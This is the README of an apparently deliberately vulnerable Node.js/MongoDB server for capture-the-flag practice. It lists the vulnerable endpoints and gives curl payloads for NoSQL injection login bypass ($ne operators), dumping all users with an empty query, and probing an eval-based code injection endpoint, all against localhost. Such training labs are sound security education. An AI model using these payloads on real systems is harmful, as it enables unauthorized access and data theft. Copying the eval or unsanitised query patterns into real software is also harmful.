# NoSQL Injection CTF Server - SHADOW_NET

A vulnerable Node.js server for practicing NoSQL injection attacks.

## Setup

### Prerequisites
- Node.js (v14 or higher)
- MongoDB (running locally or use MONGO_URI env var)

### Installation

```bash
# Clone the repository
git clone https://github.com/aBadRoy/nsoql-ctf.git
cd nsoql-ctf

# Install dependencies
npm install

# Start MongoDB (if using local)
# Make sure MongoDB is running on port 27017 or set MONGO_URI

# Run the server
npm start
```

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `MONGO_URI` | `mongodb://localhost:27017` | MongoDB connection string |
| `PORT` | `3000` | Server port |

## Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/` | Home page |
| POST | `/login` | Login (NoSQL injection vulnerable) |
| POST | `/search` | Search users |
| GET | `/users` | List users with optional filter |
| POST | `/admin/lookup` | Admin lookup (eval injection) |
| POST | `/auth` | Auth endpoint |
| GET | `/debug/collection` | Debug endpoint |

## Exploitation Examples

```bash
# NoSQL Injection - Login bypass
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# NoSQL Injection - Extract all users
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"query":{}}'

# Code Injection - Eval on /admin/lookup
curl -X POST http://localhost:3000/admin/lookup \
  -H "Content-Type: application/json" \
  -d '{"user_query":"{}"}'
```

## Disclaimer

This server contains intentional vulnerabilities for **educational purposes only**. Do not deploy on production systems or expose to the internet.
